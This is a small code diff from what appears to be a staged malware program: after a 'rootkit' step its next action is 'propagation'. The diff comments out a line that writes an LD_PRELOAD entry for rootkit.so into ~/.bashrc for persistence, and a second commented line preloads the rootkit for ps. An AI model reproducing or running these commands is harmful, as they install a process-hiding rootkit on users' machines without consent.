@@ -31,7 +31,7 @@ def run():
     dir_path = file_path.parent
     print(dir_path)
 
-    subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so'>> ~/.bashrc && source ~/.bashrc")
+    # subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so'>> ~/.bashrc && source ~/.bashrc")
     # subprocess.run("export LD_PRELOAD=./utils/rootkit.so ps", shell=True)
 
     next_action = "propagation"
